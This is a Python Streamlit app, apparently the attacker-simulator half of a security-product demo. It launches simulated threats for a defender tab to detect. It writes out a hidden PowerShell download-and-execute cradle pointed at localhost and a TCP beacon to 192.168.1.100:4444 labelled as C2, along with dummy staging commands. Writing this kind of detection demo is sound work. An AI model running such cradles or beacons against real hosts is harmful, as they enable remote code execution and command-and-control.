"""SentinelOneX V4.0 - ATTACKER APP (Streamlit Version)
Runs on Port 7860
Purpose: Simple threat launcher for demo
"""

import streamlit as st
import subprocess
import time

# Page config
st.set_page_config(
    page_title="SentinelOneX V4.0 Attacker",
    page_icon="🔴",
    layout="centered"
)

# Custom CSS
st.markdown("""
<style>
.attack-box {
    background-color: #2d0000;
    padding: 20px;
    border-radius: 10px;
    border-left: 5px solid #ff4b4b;
}
</style>
""", unsafe_allow_html=True)

# Header
st.title("🔴 SentinelOneX V4.0 - Attacker Simulator")
st.markdown("**Threat Launch Console**")
st.markdown("---")

st.info("👉 **Instructions:** Launch an attack here, then switch to the **Defender** tab (Port 7861) to watch the AI response!")

# Attack type selector
attack_type = st.selectbox(
    "🎯 Select Attack Type",
    [
        "Fileless Attack (PowerShell Cradle)",
        "Registry Persistence",
        "File Staging",
        "Network C2"
    ]
)

# Launch button
if st.button("🚀 LAUNCH ATTACK", type="primary", use_container_width=True):
    st.markdown("---")
    
    with st.spinner("Launching attack..."):
        DETACHED_PROCESS = 0x00000008
        
        try:
            if attack_type == "Fileless Attack (PowerShell Cradle)":
                # FIXED: Add 5-second sleep to keep process alive for detection
                cmd = 'powershell.exe -NoP -WindowStyle Hidden "Start-Sleep -Seconds 5; IEX (New-Object Net.WebClient).DownloadString(\'http://127.0.0.1/nonexistent-malware.ps1\')"'
            elif attack_type == "Registry Persistence":
                cmd = 'powershell.exe -NoP "Start-Sleep -Seconds 5; Write-Host windows_update_service"'
            elif attack_type == "File Staging":
                cmd = 'cmd.exe /c "echo malicious_payload > %TEMP%\\staged_malware.bin && timeout /t 5 /nobreak"'
            elif attack_type == "Network C2":
                cmd = 'powershell.exe -NoP "Start-Sleep -Seconds 5; try { $s = New-Object Net.Sockets.TcpClient; $s.Connect(\'192.168.1.100\', 4444) } catch {}"'
            
            process = subprocess.Popen(cmd, shell=True, creationflags=DETACHED_PROCESS)
            pid = process.pid
            time.sleep(1)
            
            st.success("✅ **ATTACK LAUNCHED!**")
            st.markdown(f"""
            <div class="attack-box">
                <h3>Attack Details</h3>
                <p><strong>Process ID:</strong> {pid}</p>
                <p><strong>Attack Type:</strong> {attack_type}</p>
                <p><strong>Status:</strong> ACTIVE</p>
            </div>
            """, unsafe_allow_html=True)
            
            st.warning("📡 **Switch to Defender Tab (Port 7861)** to watch the AI response!")
            
        except Exception as e:
            st.error(f"❌ Launch Failed: {e}")

# Footer
st.markdown("---")
st.markdown("### 💡 How This Works")
st.markdown("""
1. **Attacker Tab (This Window)**: You launch threats here
2. **Defender Tab (Port 7861)**: The SOAR platform detects and responds autonomously

This demonstrates:
- ✅ Real threat simulation
- ✅ Autonomous threat detection (Sentry)
- ✅ Dual AI analysis (Flash + Pro)
- ✅ Automatic remediation
""")

st.caption("SentinelOneX V4.0 | Streamlit Interface")
